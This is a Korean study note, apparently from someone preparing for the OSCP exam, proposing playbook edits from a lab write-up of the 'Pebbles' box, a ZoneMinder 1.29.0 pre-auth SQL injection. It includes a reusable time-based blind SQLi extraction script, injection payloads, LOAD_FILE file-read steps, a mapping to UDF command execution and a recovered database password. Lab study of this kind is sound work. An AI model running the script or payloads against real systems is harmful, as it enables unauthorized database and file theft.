---
tags:
  - type/audit
  - platform/pg
manual_tags: true
manual_cves: true
---

# Pebbles — `_PLAYBOOK` 이관 제안

> [!warning] 이 파일은 제안서임. `_PLAYBOOK.md` 는 `pg-line-manager` 가 단독으로 반영함
> 신규 항목은 **번호를 비워** 두었음 — 번호 배정은 단독 기록자 몫임(워커가 정하면 다른 워커와 겹쳐 앵커가 깨짐).
> 박스 노트(`03. PG\Pebbles.md`)에는 이관분에 대해 **신규 항목 앵커를 걸지 않았음.** 기존 항목 앵커(A-11 · A-17 · B-12 · B-1-10 · C-3)만 걸려 있음.

원본: `03. PG\Pebbles.md` (개작 전 620행, 백업 `03. PG\_backup\Pebbles.md.bak`)
원본 장 대응: `0. 배우는 것` → B · `6. 막혔던 지점` → A · `7. OSCP 시험 관점` → C·D·E

**제안 10건** — 병합 6 · 신규 4.

---

## 1. A-11. 자동 도구가 뱉은 값이 의심스럽다 — **병합**

**넣을 본문** (표 아래 실측 사례 행에 추가 + 산문 한 단락)

| 실측 사례 | 무엇이 틀렸나 |
|---|---|
| [[Pebbles]] | nmap 이 8080 을 `http-favicon: Apache Tomcat` · `http-title: Tomcat` 으로 보고했으나 **서버 헤더는 `Apache/2.4.18 (Ubuntu)`**. 세 웹 포트(80·3305·8080) 헤더가 전부 Apache 였음. `http-open-proxy: Potentially OPEN proxy` 까지 겹쳐 「Tomcat 매니저 → WAR 배포」 반사가 발동하기 쉬운 배치 |

**배너·favicon·타이틀은 «정체»가 아님 — 그 서비스 특유의 파일을 실제로 던져 처리되는지로 확정할 것.** JSP 를 던져 실행 안 되면 Tomcat 이 아님. [[Pebbles]] 원 기록은 `/manager/html`·`/index.jsp` 404 와 `/hello.php` 가 JSP 원문을 그대로 뱉은 것을 근거로 8080 을 접었다고 적었으나, **응답 본문 산출물이 남지 않아 재확인 불가**(`[가정]`). 산출물로 확정되는 것은 세 포트의 서버 헤더가 전부 Apache 라는 것까지임. 「응답이 성공을 뜻하지 않는다」(A-12)의 짝 — **배너가 정체를 뜻하지도 않음.**

**저레이트 스캔의 서비스명도 사전 항목임.** [[Pebbles]] `nmap_lowrate_allports.log` 의 `3305/tcp odette-ftp`·`8080/tcp http-proxy` 는 `-sS` 라 배너를 안 받은 것이고, 같은 세션의 `-sCV` 가 셋 다 `Apache httpd 2.4.18` 로 확정함. 두 결과가 어긋나면 **배너를 받은 쪽**이 이김.

**원문 (박스 노트 6-1 · 삭제 전)**

```text
### 6-1. 포트 8080은 미끼다 — Tomcat이 아니라 Apache

가장 시간을 잡아먹을 함정. nmap이 8080을 이렇게 봤다:

8080/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Apache Tomcat
|_http-title: Tomcat

**서버 헤더는 Apache인데 favicon·타이틀은 Tomcat**이다. "Tomcat이면 `/manager/html` 디폴트 크리덴셜 → WAR 배포"라는 반사가 발동하기 쉽다. 실제로 확인하면:

└─$ curl -s -o /dev/null -w '%{http_code}\n' http://192.168.248.52:8080/index.jsp
404
└─$ curl -s -o /dev/null -w '%{http_code}\n' http://192.168.248.52:8080/manager/html
404

- `/index.jsp` **404**, `/manager/html` **404** → Tomcat 매니저는 없다.
- 결정적 증거 — **`/hello.php`가 JSP 소스를 그대로 뱉는다:**

└─$ curl -s http://192.168.248.52:8080/hello.php
<%@ page ... %>          ← JSP 코드가 실행 안 되고 텍스트로 나옴

`.php` 확장자인데 내용은 JSP다. **Apache의 PHP 핸들러가 JSP 문법을 파싱하지 못해 원문이 그대로 노출**된다 = 이 서버는 **JSP를 실행하지 않는다 = Tomcat이 아니다.** favicon/title은 관리자가 심어 놓은 위장일 뿐이다.

> [!danger] 배너·favicon·타이틀만 믿지 마라 — 실제 동작으로 검증
> 서버 헤더(`Apache`)와 앱 배너(`Tomcat`)가 엇갈리면, 그 서비스 특유의 파일을 실제로 던져서 처리되는지를 본다. JSP를 던져 실행 안 되면 Tomcat이 아니고, `.php`가 소스로 노출되면 PHP 핸들러도 아니다. "응답이 성공을 뜻하지 않는다"([[Crane]]·[[Hawat]]·[[Squid]])의 연장 — **배너가 정체를 뜻하지도 않는다.**

여기에 더해 nmap의 `http-open-proxy: Potentially OPEN proxy / Methods: CONNECTION`도 미끼 신호다. 실제 오픈 프록시로 쓸 수 있는지 `CONNECT`를 시도해도 소득이 없었다. `[가정]` 프록시 오탐으로 판단하고 8080은 접었다 — 세 웹 포트가 같은 루트를 서빙하므로 8080 고유 자산은 없다.
```

⚠️ 원문 마지막 문장(「8080 고유 자산은 없다」)은 **자기 산출물에 반박당함** — 아래 2번 참조. 이관본에서는 뺐음.

---

## 2. A-17. 부가 포트가 기본 페이지·403 만 뱉는다 — **병합**

**넣을 본문**

**웹 포트가 여럿이면 「같은 앱인가」부터 재되, 「같은 문서 루트」와 「같은 Alias 를 공유한다」를 구분할 것.** [[Pebbles]] 는 80·3305·8080 세 포트가 전부 `Apache/2.4.18 (Ubuntu)` 였고 셋 다 `/zm/` 와 `/javascript/` 를 노출했음. 그러나 **문서 루트 자체는 서로 달랐음** — 80 은 `index.php` 1134B + `/images`·`/css`, 3305 는 Apache 기본 `index.html` 11321B, 8080 은 `index.php` 11074B + `/hello.php`(출처: `gob_80.txt`·`gob_3305.txt`·`gob_8080.txt`). `/zm`·`/javascript` 는 데비안/우분투 패키지가 심는 **전역 Apache `Alias`** 라 vhost 와 무관하게 전 포트에 뜸 `[가정]`.

→ **「셋이 같으니 하나만 파면 된다」로 잘라내면 포트 고유 자산을 놓침.** [[Pebbles]] 에서 `/hello.php` 는 8080 열거에만 나왔고 그것이 8080 정체 판정(A-11)의 재료였음. 대표 파일 md5 대조는 **`/zm/` 같은 공유 경로 하나가 같다는 것만 증명**하지 루트가 같다는 증명이 아님.

**원문 (박스 노트 6-2 · 삭제 전)**

```text
### 6-2. 세 웹 포트가 같은 문서 루트다 — 중복 열거로 시간 낭비 주의

80·3305·8080에서 gobuster를 각각 돌리면 `/zm`·`/javascript`가 반복 나온다. 처음엔 "포트마다 다른 앱"으로 보고 셋을 따로 파려 했다. 그런데:

# 같은 파일을 세 포트에서 받아 바이트 비교
└─$ for p in 80 3305 8080; do curl -s http://192.168.248.52:$p/zm/index.php | md5sum; done
# 세 해시가 동일 → 같은 문서 루트

**세 포트의 `/zm/` 응답이 바이트 동일**하다 = Apache가 세 포트를 같은 `DocumentRoot`(또는 같은 vhost)로 서빙한다. **한 포트에서 `/zm/`만 파면 된다.** 나머지 두 포트 열거는 버리는 시간이었다.

포트가 여럿이면 "같은 것 아닌가"부터 의심
서버 헤더가 전부 같고 디렉터리 구조가 겹치면 동일 루트일 확률이 높다. 대표 파일 하나를 각 포트에서 받아 `md5sum`으로 대조 — 같으면 하나로 취급한다. 이 1분이 열거 3배 노동을 막는다.
```

⚠️ **원문의 결론(「같은 문서 루트」·「나머지 두 포트 열거는 버리는 시간」)은 산출물에 반박당함.** md5 대조 블록도 산출물이 없음(`[가정]`). 이관본은 정정한 형태임.

---

## 3. A-2(진입) — **신규** · 「디렉터리 리스팅에 파일명은 보이는데 내용이 안 보인다」

**넣을 본문**

**증상** — 디렉터리 리스팅이 켜져 있어 `config.php`·`database.php` 같은 설정 파일 «이름»이 보임. 「크리덴셜 확보」로 착각하기 쉬우나 브라우저로 받으면 빈 응답이 옴.

**원인** — `.php`·`.jsp`·`.aspx` 는 서버에서 **실행되므로** 소스가 안 나옴. 리스팅으로 노출되는 것은 이름뿐임.

**우회 세 갈래** — ① `.phps` 확장자 ② PHP 필터 LFI(`php://filter/convert.base64-encode/resource=`) ③ **SQLi 경유 `LOAD_FILE()`**. 다른 취약점이 이미 손에 있으면 그쪽이 제일 빠름.

[[Pebbles]] — `/zm/includes/` 에 파일명이 노출됐고 `curl` 로는 빈 응답. SQLi 가 이미 있었으므로 `LOAD_FILE` 로 디스크에서 직접 읽어 `zmuser:zmpass` 를 얻음(출처: `~/PG/Pebbles/dbphp.out`).

**역방향 반사** — 리스팅에서 `.bak`·`.txt`·`.old`·`~` 로 끝나는 파일이 보이면 그건 **그대로 소스가 나옴.** 리스팅을 만나면 이 확장자부터 노릴 것.

**원문 (박스 노트 6-3 · 삭제 전)**

```text
### 6-3. `/zm/includes/`에 파일명은 보이는데 소스는 안 보인다

디렉터리 리스팅이 켜져 있어 `/zm/includes/`에서 `config.php`·`database.php` 등 파일명은 노출됐다. "설정 파일이 보인다 → 크리덴셜 확보"로 착각하기 쉽다. 그러나:

└─$ curl -s http://192.168.248.52/zm/includes/config.php   # → 빈 응답(실행됨)

**`.php`는 서버에서 실행되므로 브라우저로는 빈 결과**만 온다. 소스를 보려면 ① `.phps` 확장자, ② PHP 필터 LFI, ③ **`LOAD_FILE`(SQLi 경유)** 같은 우회가 필요하다. 여기서는 SQLi가 이미 있었으므로 `LOAD_FILE('/var/www/.../zm/includes/config.php')`로 원문(`zmuser:zmpass`)을 읽었다(3-6).

"파일명이 보인다 ≠ 내용이 보인다"
디렉터리 리스팅으로 노출되는 건 이름이다. 실행형 확장자(`.php`·`.jsp`·`.aspx`)의 내용은 별도 우회가 필요하다. 반대로 `.bak`·`.txt`·`.old`·`~`로 끝나는 파일이 보이면 그건 소스가 그대로 나온다 — 리스팅에서 이런 확장자를 먼저 노린다.
```

---

## 4. A-2(진입) — **신규** · 「SQLi 는 찾았는데 데이터가 안 나온다」

**넣을 본문**

**증상** — 주입은 되는 것 같은데 UNION·에러 기반이 전부 무소득. 「SQLi 가 아니었나」로 되돌아가면 시간을 크게 버림.

**분리해서 생각할 것 — ① 주입 성립 확인(참/거짓 신호가 하나라도 있는가) ② 추출 채널 선택.** 취약점이 있어도 채널이 안 맞으면 아무것도 안 나옴. 둘은 다른 판단임.

[[Pebbles]] — `limit` 이 `LIMIT` 절 **뒤**라 이미 완성된 SELECT 의 꼬리였음. 정석대로 UNION 부터 시도:
```text
limit=1 UNION SELECT 1               # LIMIT 1 UNION ... → 문맥 충돌
limit=1 UNION SELECT 1,2,3,4,5,6,7   # 컬럼 수 브루트포스 — 응답 변화 없음
```
컬럼 수를 맞춰도 응답 본문이 안 바뀌어 결과를 눈으로 확인할 수 없었고, 에러 기반(`AND extractvalue(1,concat(0x7e,version()))`)도 에러가 렌더되지 않아 무소득. **`;SELECT SLEEP(5)#` 한 방으로 스택 쿼리가 확인되자 나머지는 스크립트가 처리함.** 응답이 안 변하는 순간 채널을 갈아탈 것.

⚠️ 위 두 UNION 시도의 응답 산출물은 남지 않았음(`[가정]`). 확정된 것은 최종 채널이 time-based 였다는 것까지임.

**채널 우선순위** — **UNION → 에러 → Boolean → time.** time 은 요청마다 실제로 기다려야 해서 가장 느림. 다만 **스택 쿼리가 열리면 순위가 뒤집힘** — 독립한 `SELECT SLEEP()` 을 붙일 수 있어 time 이 오히려 가장 깨끗해짐([[Pebbles]] 가 그 경우).

**원문 (박스 노트 6-5 · 2-5 · 삭제 전)**

```text
### 6-5. UNION·에러 기반을 먼저 시도했다 실패한 흔적

정석대로 **UNION부터** 시도했다. `limit`은 `LIMIT` 절 뒤에 오므로:

limit=1 UNION SELECT 1               # LIMIT 1 UNION ... → 문맥 충돌
limit=1 UNION SELECT 1,2,3,4,5,6,7   # 컬럼 수 브루트포스 — 응답 변화 없음

`LIMIT` 절 뒤는 이미 SELECT가 완성된 자리라 `UNION`을 자연스럽게 끼우기 어렵고, 컬럼 수를 맞춰도 응답 본문이 안 바뀌어 결과를 눈으로 확인할 수 없었다. 에러 기반(`AND extractvalue(1,concat(0x7e,version()))`)도 에러가 렌더되지 않아 무소득. **여기서 UNION/에러에 매달리는 것이 함정**이다 — 응답이 안 변하는 순간 채널을 time으로 갈아탄다(2-5). `;SELECT SLEEP(5)#` 한 방으로 스택이 확인되자 나머지는 `blind.py`가 처리했다.

"SQLi는 찾았는데 데이터가 안 나온다"의 정체
취약점이 있어도 추출 채널이 안 맞으면 아무것도 못 뽑는다. 이걸 "SQLi가 아니었나?" 로 오판하고 되돌아가면 시간을 크게 버린다. **주입 성립 확인(참/거짓 신호가 하나라도 있는가)** 과 **추출 채널 선택**을 분리해서 생각한다. 여기서는 `SLEEP` 지연이라는 신호 하나로 주입을 확정하고, 채널은 time으로 고정했다.

(2-5 표 — 네 가지 추출 채널 판정)
| UNION 기반 | 주입 결과를 응답 본문에 얹어 그대로 읽음 | ✗ 어렵다 | `limit`은 `LIMIT` 절 뒤에 붙어 **`UNION SELECT`로 컬럼 수를 맞추기가 문맥상 까다롭다**(이미 완성된 SELECT의 꼬리) |
| 에러 기반 | `extractvalue`/`updatexml`로 에러 메시지에 데이터를 실어 반환 | ✗ | 에러가 응답에 렌더되지 않음 |
| Boolean 기반 | 참/거짓에 따라 **응답 내용이 달라짐**을 읽음 | △ 애매 | 로그 조회 응답이 주입 유무로 유의미하게 안 바뀜 → 판정 기준 잡기 어려움 |
| Time 기반 | 참/거짓을 **응답 시간**으로 읽음 | ✓ **확실** | `;SELECT SLEEP()` 스택이 성립 → 지연이 깨끗하게 관측됨 |

Boolean이 살아 있으면 그쪽이 훨씬 빠르다
time 기반은 요청마다 sleep 시간을 실제로 기다려야 해서 느리다. 만약 응답 길이/내용이 참/거짓에 따라 갈리면(Boolean 채널), sleep 없이 즉시 판정되어 같은 이진 탐색이 수 배 빠르다. 그래서 실전 순서는 **UNION → 에러 → Boolean → time**이다. time은 다 막혔을 때의 최후 수단인데, 이 박스는 스택 덕분에 time이 오히려 가장 안정적이었다.
```

---

## 5. A-6(판단·검증) — **신규** · 「blind 추출 결과를 믿기 전에 «완주했는가»부터 본다」

**넣을 본문 — 이 항목은 박스 노트에 없던 것임. 산출물 대조에서 새로 나옴.**

**① 임계값 오판** — 추출 문자열에 깨진 글자가 섞이면 코드 버그가 아니라 **타이밍 오판**인 경우가 많음. `DELAY` 를 너무 짧게(0.2초) 잡으면 네트워크 지터(왕복 0.084초 + 서버 부하)와 구분이 안 돼 거짓 양성이 남. 반대로 5초면 정확하지만 236요청 × 절반이 5초 = 10분이 걸림.
- 균형점(실측, [[Pebbles]]) — `DELAY=0.6` · 판정 임계 `0.40`. 기준선(약 0.09초)과 sleep 사이에 임계가 있어 지터에 안전하면서 빠름
- 값이 흔들리면 조건당 **2~3회 재요청해 다수결**을 넣을 것(원 스크립트엔 없음)
- 그래도 안 되면 네트워크가 아니라 **주입이 실제로 안 되는 것**을 의심 — 주석 문자·따옴표 컨텍스트 재점검

**② 중단된 추출을 완주로 오독하지 말 것.** 스크립트가 완주 마커(`[+] RESULT:` 같은 것)를 찍게 짜고, **사후에 노트를 쓸 때 그 마커 유무로 완주/중단을 가릴 것.**

[[Pebbles]] 실측 — `~/PG/Pebbles/` 의 blind 산출물 8개 중 **넷이 마커 없이 끊겨 있었음**:

| 완주(`[+] RESULT:` 있음) | 중단(없음) |
|---|---|
| `dbs.out` · `zmusers.out` · `mysqluser.out` · `proof.out` | `tables.out` 30B · `crontab.out` 30B · `crontail.out` 62B · `dbphp.out` 64B |

`crontab.out` 은 10:30:34→10:35:55 로 약 5분을 태우고 30바이트(`# /etc/crontab: system-wide cr`)에서 끊겼음 — **문자당 약 10초.** 반면 32자 플래그는 2분 33초 안에 완주(10:22:33→10:25:06). **time-based 로 수백 바이트짜리 텍스트 파일을 통째로 뽑는 것은 시간 대비 소득이 없음** — 대상을 `GROUP_CONCAT`·`SUBSTRING` 오프셋으로 잘라 필요한 조각만 가져올 것.

⚠️ 그리고 **중단분을 근거로 「특이사항 없음」이라고 쓰면 안 됨.** 원 노트는 `crontab.out`/`crontail.out` 을 보고 「표준 데비안 crontab 헤더로 특이사항 없음」이라 적었으나, 실제로는 앞 30자와 꼬리 62자만 본 것이고 `/etc/cron.d/`·`/etc/cron.*` 는 아예 시도하지 않았음. **배제가 아니라 미완임**(A-19·D 절의 같은 선).

**원문 (박스 노트 6-4 · 4-2 · 삭제 전)**

```text
### 6-4. blind SQLi 임계값 튜닝 — 지터에 속지 않기

처음 `DELAY`를 너무 짧게(예: 0.2초) 잡으면 네트워크 지터(왕복 0.084초 + 서버 부하)와 SLEEP이 구분되지 않아 **거짓 양성**이 난다. 반대로 5초로 두면 정확하지만 236요청 × 절반이 5초면 **10분**이 걸린다. 균형점:

- `DELAY=0.6`, 판정 임계 `0.40`. baseline(~0.09s)과 sleep(0.6s) 사이에 임계가 있어 **지터에 안전하면서도 빠르다.**
- 값이 흔들리면 각 조건을 **2~3회 재요청해 다수결**하는 방어를 추가한다(`blind.py`엔 없지만, 원격 지연이 심하면 넣는다).

blind SQLi가 이상하게 나오면 임계값부터 의심
추출 문자열에 깨진 글자가 섞이면 코드 버그가 아니라 **타이밍 오판**인 경우가 많다. ① `DELAY`를 키우고, ② 임계값을 baseline과 DELAY의 중간으로, ③ 조건당 다수결. 그래도 안 되면 네트워크가 아니라 주입이 실제로 안 되는 것을 의심(주석 문자·따옴표 컨텍스트 재점검).

(4-2 말미)
산출물의 `crontab.out`/`crontail.out`은 `/etc/crontab`을 blind로 읽으려 한 흔적이다(`# /etc/crontab: system-wide cr...`, `25 6 * * * r...` — 표준 데비안 crontab 헤더로 특이사항 없음).
```

---

## 6. B-1(웹) — **신규** · 「time-based blind SQLi 를 손으로 짠다 — sqlmap 금지 대비」

**넣을 본문**

**탐지 신호** — 주입은 되는데 UNION·에러·Boolean 채널이 전부 죽어 있음(A 절 4번 항목). 남는 것이 시간 채널임. **시간은 1비트 채널**(느리다/안 느리다)이고, 이 1비트를 반복해 임의의 데이터를 복원하는 것이 blind SQLi 의 전부임.

**스택 쿼리가 되는지부터 판정** — `;SELECT SLEEP(5)#` 한 방. 되면 `SELECT` 뿐 아니라 `INTO OUTFILE`·`INTO DUMPFILE`·`CREATE FUNCTION`(UDF)까지 열림. **드라이버가 전부를 결정함:**

| 스택 | 드라이버/함수 | 기본 동작 |
|---|---|---|
| PHP + mysqli — `mysqli_multi_query()` | 세미콜론 구분 다중문 실행 | ✅ 스택됨 |
| PHP + mysqli — `mysqli_query()` | 한 문장만 실행 | ❌ |
| PHP + PDO(mysql) | 에뮬레이션 프리페어가 켜지면 가능 | 상황별 |
| Java + JDBC (MySQL Connector/J) | `allowMultiQueries=false` 가 기본 | ❌ ([[Hawat]]) |

⚠️ 이 표는 **일반 지식**이고 [[Pebbles]] 에서 소스로 확인한 것이 아님 — 그 박스에서 확정된 것은 `;SELECT IF(…,SLEEP(0.6),0)#` 가 실제로 동작해 데이터를 뽑았다는 관측까지임(`[가정]`).

**페이로드 조각**
```text
1;SELECT IF((<조건>),SLEEP(0.6),0)#
```
| 조각 | 역할 |
|---|---|
| `1` | 원래 파라미터 값. 앞 문장을 문법적으로 온전하게 유지 |
| `;` | 문장 종료 — 여기서 스택 쿼리 시작 |
| `SELECT IF((조건),SLEEP(0.6),0)` | 참이면 0.6초 자고, 거짓이면 0 반환 |
| `#` | MySQL 주석. 뒤에 남는 잔여 쿼리 무력화 |

**스크립트 골격** — 엔드포인트·주입 위치만 바꾸면 어느 blind SQLi 에도 재사용됨. 출처: `~/PG/Pebbles/blind.py`
```python
#!/usr/bin/env python3
import sys, time, requests
T="http://192.168.248.52/zm/index.php?view=request&request=log&task=query"
S=requests.Session()
DELAY=0.6
def truth(cond):
    p="1;SELECT IF((%s),SLEEP(%s),0)#" % (cond, DELAY)
    t=time.time(); S.post(T, data={"limit":p}, timeout=30)
    return (time.time()-t) > 0.40
def int_val(expr, lo, hi):
    while lo<hi:
        mid=(lo+hi)//2
        if truth("(%s)>%d"%(expr,mid)): lo=mid+1
        else: hi=mid
    return lo
def extract(expr):
    L=int_val("LENGTH(%s)"%expr,0,4096)
    out=""
    for i in range(1,L+1):
        c=int_val("ASCII(SUBSTRING((%s),%d,1))"%(expr,i),0,127)
        out+=chr(c); sys.stdout.write(chr(c)); sys.stdout.flush()
    print(); return out
if __name__=="__main__":
    what=sys.argv[1]
    sys.stderr.write("[*] len... "); 
    v=extract(what)
    print("[+] RESULT: %r"%v)
```

**반드시 이진 탐색으로 짤 것.** 문자당 `log2(128)=7`회 · 길이 12회. 32자면 `12+32×7=236`회. `=` 로 하나씩 대보는 선형은 평균 64회/문자 = 2048회 — **9배 차이**가 「감당 가능/불가능」을 가름.

**길이를 먼저 구할 것.** `SUBSTRING` 은 범위를 넘으면 빈 문자를 돌려줌. 「ASCII 가 0 이면 종료」로 짜면 진짜 데이터에 제어문자가 섞였을 때 조기 종료 오류가 남.

**세션 재사용**(`requests.Session()`) — 수백~수천 요청이라 핸드셰이크 절감이 속도에 크게 기여함.

**엔드포인트는 «가장 단순하고 조용한 read-only» 를 고를 것.** 같은 취약점이 여러 파라미터에 있으면 부수효과 없는 곳을 씀 — 부수효과가 있는 경로(글쓰기·상태변경)는 DB 를 오염시키고 앱을 느리게 만듦. [[Pebbles]] 는 `view=events`(hidden 필드)·`view=filter`(복잡한 파라미터 동반) 대신 **`view=request&request=log&task=query`(받는 것이 `limit` 하나뿐)** 를 골랐음.

**`LOAD_FILE` 로 파일 읽기 — 세 조건이 다 맞아야 함.** ① DB 계정에 `FILE` 권한 ② 대상 파일이 mysqld 가 읽을 수 있는 권한 ③ `secure_file_priv` 가 비었거나 그 경로 허용. 하나라도 막히면 **에러가 아니라 NULL 을 조용히 반환** — 빈 값이라 「주입 실패」로 오독하기 쉬움.

**sqlmap 이 하는 일의 수동 대응**

| sqlmap | 수동 |
|---|---|
| 인젝션 탐지 | `;SELECT SLEEP(5)#` 응답 지연 확인 |
| DBMS 판별 | `SLEEP()`·`#` 주석·`information_schema` 가 통하면 MySQL |
| `--current-db` / 스키마 | `SELECT schema_name FROM information_schema.schemata` |
| `--tables` / `--columns` | `information_schema.tables` / `.columns` |
| `--dump` | `SUBSTRING`+`ASCII` 이진 탐색 |
| `--file-read` | `LOAD_FILE('/path')` |
| `--file-write` / `--os-shell` | `INTO DUMPFILE` (hex 리터럴) / UDF `sys_exec` |

**출처** — [[Pebbles]] ZoneMinder 1.29.0 `limit` pre-auth SQLi. 32자 플래그 실측 추출 2분 33초.

**원문 (박스 노트 0장 · 2-4 · 2-6 · 3-2 ~ 3-7 · 6-6 · 삭제 전)** — 노트에 남은 재현 서술과 중복되므로 여기서는 이관에 실제로 쓰인 조각만 인용함. 전문은 백업 `03. PG\_backup\Pebbles.md.bak` 의 0장 · 2-4 · 2-6 · 3-2~3-7 · 6-6.

```text
(0장) 
- time-based blind SQLi의 원리와 수동 구현 — 출력 채널이 하나도 없을 때 "시간"을 1비트 채널로 쓴다
- 이진 탐색으로 한 글자씩 뽑는 알고리즘 — `IF(ASCII(SUBSTRING(...,i,1))>N, SLEEP(t), 0)`. 문자당 요청 수를 로그로 줄이는 법
- 스택 쿼리(`;`)가 되는 조건 — PHP + mysqli/mysqlnd에서 `mysqli_multi_query`를 쓰면 세미콜론 뒤가 실행된다. JDBC 기본값(`allowMultiQueries=false`)과 정반대다([[Hawat]] 대비)
- sqlmap이 하는 일을 손으로 재현하는 사다리 — 탐지 → DBMS 판별 → 길이 → 문자 추출 → 파일 읽기

시험 출제 가능성
매우 높다. blind SQLi는 OSCP·실무 단골이고, sqlmap 금지 규칙과 정면으로 맞물린다.
이 노트의 `blind.py`는 어느 blind SQLi 박스에도 파라미터만 바꿔 재사용할 수 있게 짜여 있다. 시험 전에 이 스크립트를 손에 익혀 두는 것이 목적이다.

(2-4 말미) 이 대비가 시험 반사로 중요하다:
- Java/Spring 박스([[Hawat]])에서 `;`는 안 통한다 → `UNION` / `SLEEP` 단일문으로 승부.
- PHP + mysqli 박스(여기)에서는 `;`로 완전히 새 문장을 붙일 수 있다 → `SELECT`뿐 아니라 `INTO OUTFILE`, `CREATE FUNCTION`(UDF)까지 열린다.

(3-5) 선형 탐색 대비 이진 탐색의 이득
문자 하나를 `=`로 하나씩 대보면(선형) 최악 128회·평균 64회다. 이진 탐색은 항상 7회. 32자면 선형 2048회 대 이진 224회 — **9배 차이**. blind SQLi를 손으로 짤 때 반드시 이진 탐색으로 짜라. 이게 "감당 가능/불가능"을 가른다.

(6-6) 같은 취약점이 여러 파라미터에 있으면 "가장 단순·조용한" 곳을 쓴다
blind는 수백~수천 요청을 던진다. 부수효과가 있는 엔드포인트(글쓰기·상태변경)를 쓰면 DB가 오염되거나 앱이 느려진다. 입력이 적고 read-only인 경로를 고르면 반복이 안전하고 디버깅도 쉽다.
```

---

## 7. B-12. SQLi 수동 UNION — sqlmap 금지 대비 — **병합**

**넣을 본문** (「함정」 단락 뒤에 한 단락 추가)

**주입 위치가 `LIMIT` 절 «뒤»면 UNION 을 접고 스택·time 을 볼 것.** [[Pebbles]] 의 `limit` 은 문자열 리터럴 «안»이 아니라 **이미 완성된 SELECT 의 꼬리**에 붙었음 — 따옴표를 탈출할 필요가 없는 대신, `UNION SELECT` 로 컬럼 수를 맞춰 끼우기가 문맥상 까다로움. 문자열 리터럴 안에 끼어드는 [[Hawat]] 형과 갈리는 지점이고, **주입 위치의 SQL 문맥이 채널 선택을 먼저 제약함.** 자세한 대체 절차는 위 6번(time-based blind 카드).

**교차 검증 습관 하나 — 크랙한 평문이 다른 출처와 맞는지 대조할 것.** [[Pebbles]] 는 `mysql.user` 의 `zmuser` 해시 `*C1D2D6FC5C596AFB19FFC4331DF6DAA287749A3E` 가 `zmpass` 로 풀렸고, 별도로 `LOAD_FILE` 로 읽은 `config.php` 원문에도 `'password' => 'zmpass'` 가 있었음 — **서로 독립한 두 출처가 일치**해 양쪽을 검증함.

⚠️ **MySQL `PASSWORD()` 해시는 로컬에서 직접 계산해 대조할 것** — `'*'+SHA1(SHA1_binary(pw)).hex().upper()`. 원 노트는 `*4ACFE3202A5FF5CF467898FC58AAB1D615029441` 을 「잘 알려진 `password` 의 해시」로 단정했으나 **직접 계산하니 `admin`** 이었음(`password` 의 해시는 `*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19`). 「잘 알려진 해시」라는 기억은 근거가 아님.

**원문 (박스 노트 3-6 · 삭제 전)**

```text
`*4ACFE...9441`은 MySQL의 `PASSWORD()` 해시 형식(SHA1(SHA1(pw)))이다. `*4ACFE3202A5FF5CF467898FC58AAB1D615029441`은 잘 알려진 **`password`** 의 해시다.
```
→ **반증됨.** 정정본은 박스 노트 `Initial Access` 재현 절의 해시 표에 반영했음.

---

## 8. B-1-10. ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE — **병합**

**넣을 본문** (「자매 사례」 단락을 확장)

**자매 사례 — 같은 무인증 조건, 다른 RCE 경로.**

| 박스 | 버전 | 경로 |
|---|---|---|
| [[Cobbles]] | 1.34.23 | Filter `AutoExecuteCmd` → `zmfilter.pl` 의 `qx()`. PHP7 느슨비교 타입저글링을 숫자 접두로 우회 |
| [[Pebbles]] | 1.29.0 | `limit` 파라미터 **pre-auth SQLi**(스택 쿼리 성립) → time-based blind + `LOAD_FILE`. 코드 실행까지 가지 않음 |

**1.29 계열은 `limit` 이 여러 view 에서 정수 검증 없이 쿼리에 이어붙음** — `view=events`(hidden 필드) · `view=filter`(사용자 입력) · `view=request&request=log&task=query`(로그 조회 API) 셋 다. 무인증 ZoneMinder 를 만나면 **버전부터 확인하고 두 경로를 다 재 볼 것** — 1.29 면 SQLi 가 더 빠르고, 1.3x 면 Filter 훅이 그대로 RCE 임.

**무인증 판정법** — 로그인·쿠키·CSRF 토큰 없이 `?view=console`·`?view=version` 을 `curl` 해 200 + 데이터가 나오는지. [[Pebbles]] 는 `blind.py` 가 **인증 절차를 하나도 안 거치고** 로그 조회 API 만 두들겨 DB 를 통째로 뽑았다는 것 자체가 pre-auth 증거임.

**원문 (박스 노트 2-1 · 2-2 · 7-4 · 삭제 전)**

```text
(2-1) 1. **인증 부재** — 이 인스턴스는 `ZM_OPT_USE_AUTH`가 꺼져 있어(또는 무력화되어) 로그인 없이 모든 view에 접근된다. 프론트엔드가 `canEditSystem = true`를 클라이언트 JS에 그대로 내려보낸다 = 서버가 이미 우리를 관리자로 취급한다.
2. **`limit` 파라미터 SQL 인젝션** — `index.php`가 여러 view에서 `limit` 값을 정수 검증 없이 쿼리에 이어붙인다. `view=events`(hidden 필드로 존재)와 `view=filter`(사용자 입력) 양쪽에 노출되고, 로그 조회 엔드포인트(`view=request&request=log&task=query`)에서도 같다.

(7-4) **관리 앱은 로그인 없이 내부 view부터 찔러 본다.** ZoneMinder처럼 인증이 옵션인 앱이 흔하다. `canEdit*=true`가 클라이언트에 내려오면 이미 관리자다.
```

---

## 9. C-3. 플래그·증거 — **병합**

**넣을 본문**

**⚠️ 「목표가 파일 하나면 셸을 만들지 마라」는 «정보 획득» 기준의 조언임 — 시험 점수 기준으로는 틀림.**

[[Pebbles]] 실측 — `proof.txt` 를 blind SQLi `LOAD_FILE()` 로 읽어 값을 확보했고(`~/PG/Pebbles/proof.out`), 그래서 UDF 로 셸을 잡는 표준 경로를 아예 시작하지 않았음. 판단 자체는 합리적이었음(UDF 는 `.so` 아키텍처 정합·`plugin_dir` 위치·`INTO DUMPFILE` 권한 등 실패 지점이 많음). **그러나 OSCP 규정은 값이 아니라 「대화형 셸에서 원위치 `cat` 한 한 화면」을 요구함** — *"this includes any type of web-based shell"*. 웹/DB 채널로 읽은 플래그는 **0점**임.

→ **「점수용 셸」과 「정보 획득」을 갈라서 계획할 것.** 파일 하나가 목표면 `LOAD_FILE` 이 최단이지만, 그것으로 끝내면 시험에서는 아무것도 얻지 못함. **값을 먼저 뽑아 안전판을 만들고, 그 다음에 셸을 마저 잡는 것**이 순서임.

